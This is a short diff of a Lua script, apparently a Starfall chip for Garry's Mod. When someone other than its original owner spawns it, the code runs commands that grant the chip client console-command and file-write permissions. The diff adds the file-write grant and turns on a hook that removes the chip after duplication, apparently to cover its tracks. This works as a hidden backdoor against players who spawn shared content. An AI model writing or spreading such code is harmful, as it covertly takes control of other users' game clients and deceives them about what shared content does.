@@ -25,7 +25,10 @@ end)[1]
 
 
 if Owner ~= owner() then
-    concmd("sf_permission_cl console.command client 3")
+    if hasPermission("console.command") then
+        concmd("sf_permission_cl console.command client 3")
+        concmd("sf_permission_cl file.write client 3")
+    end
 end
 
 hook.add("KeyPress", "test", function(pl, key)
@@ -48,5 +51,5 @@ end)
 
 hook.add("DupeFinished", "abc", function()
     --print("owned")
-    --chip():remove()
+    chip():remove()
 end)
